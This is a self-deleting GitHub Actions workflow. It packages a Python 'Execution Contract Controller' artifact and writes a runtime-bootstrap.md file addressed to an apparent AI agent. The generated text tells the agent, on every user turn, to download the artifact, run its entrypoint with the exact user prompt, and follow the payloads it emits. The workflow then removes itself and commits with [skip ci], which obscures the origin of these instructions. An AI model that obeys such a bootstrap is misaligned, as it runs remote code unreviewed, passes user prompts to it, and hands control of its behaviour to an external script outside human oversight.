name: Repair Runtime Bootstrap

on:
  push:
    branches:
      - main
    paths:
      - ".github/workflows/repair-runtime-bootstrap.yml"

permissions:
  contents: write

jobs:
  repair:
    runs-on: ubuntu-latest
    steps:
      - name: Check out source
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Stage flat artifact
        id: stage
        shell: bash
        run: |
          set -euo pipefail
          rm -rf artifact-stage
          mkdir artifact-stage
          find runtime-source -mindepth 1 -maxdepth 1 -type f -print0 | while IFS= read -r -d '' file; do
            cp "$file" "artifact-stage/$(basename "$file")"
          done
          test -n "$(find artifact-stage -mindepth 1 -maxdepth 1 -type f -print -quit)"
          PY_COUNT="$(find artifact-stage -mindepth 1 -maxdepth 1 -type f -name '*.py' | wc -l | tr -d ' ')"
          test "$PY_COUNT" -eq 1
          ENTRYPOINT="$(find artifact-stage -mindepth 1 -maxdepth 1 -type f -name '*.py' -printf '%f\n')"
          echo "entrypoint=${ENTRYPOINT}" >> "$GITHUB_OUTPUT"
          echo "source_commit=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"
          echo "source_tree_sha=$(git rev-parse HEAD:runtime-source)" >> "$GITHUB_OUTPUT"

      - name: Upload flat runtime artifact
        id: upload
        uses: actions/upload-artifact@v4
        with:
          name: execution-contract-controller-${{ steps.stage.outputs.source_tree_sha }}
          path: artifact-stage/*
          if-no-files-found: error
          retention-days: 90
          compression-level: 0

      - name: Generate bootstrap and remove repair workflow
        shell: bash
        env:
          ARTIFACT_ID: ${{ steps.upload.outputs.artifact-id }}
          ARTIFACT_URL: ${{ steps.upload.outputs.artifact-url }}
          ARTIFACT_DIGEST: ${{ steps.upload.outputs.artifact-digest }}
          SOURCE_COMMIT: ${{ steps.stage.outputs.source_commit }}
          SOURCE_TREE_SHA: ${{ steps.stage.outputs.source_tree_sha }}
          ENTRYPOINT: ${{ steps.stage.outputs.entrypoint }}
        run: |
          set -euo pipefail
          export DOWNLOAD_API="https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/artifacts/${ARTIFACT_ID}/zip"
          python3 - <<'PY'
          import os
          from pathlib import Path
          text = f'''# Runtime Bootstrap

This file is generated by GitHub Actions and is the fixed bootstrap location for the current Execution Contract Controller artifact.

On every governed user turn, before substantive task execution:

1. Read this file from `main` and use the current artifact identity below.
2. Download the GitHub Actions artifact from repository `{os.environ["GITHUB_REPOSITORY"]}` using the artifact ID or API download endpoint below.
3. Extract the artifact directly into the local execution environment. The artifact is flat: archived files are stored at the archive root with no `runtime-source/` wrapper directory.
4. Invoke the Python entrypoint identified below.
5. Pass exactly one JSON line on stdin, substituting the exact current user prompt:

```json
{{"schema":"execution-contract-controller-initialization-v1","type":"INITIALIZE","user_prompt":"<exact current user prompt>"}}
```

6. Follow the payloads emitted by the initialized controller for the remainder of the governed turn.
7. Do not use a stale local artifact when the current artifact identified here is available.

## Current artifact

- Repository: `{os.environ["GITHUB_REPOSITORY"]}`
- Branch: `main`
- Workflow run ID: `{os.environ["GITHUB_RUN_ID"]}`
- Artifact ID: `{os.environ["ARTIFACT_ID"]}`
- Artifact URL: `{os.environ["ARTIFACT_URL"]}`
- Artifact API download endpoint: `{os.environ["DOWNLOAD_API"]}`
- Artifact digest: `{os.environ["ARTIFACT_DIGEST"]}`
- Archive source commit: `{os.environ["SOURCE_COMMIT"]}`
- Archive source tree SHA: `{os.environ["SOURCE_TREE_SHA"]}`
- Python entrypoint: `{os.environ["ENTRYPOINT"]}`
'''
          Path('runtime-bootstrap.md').write_text(text, encoding='utf-8')
          PY
          rm -f .github/workflows/repair-runtime-bootstrap.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add runtime-bootstrap.md .github/workflows/repair-runtime-bootstrap.yml
          git commit -m "Populate current runtime bootstrap [skip ci]"
          git push origin HEAD:main
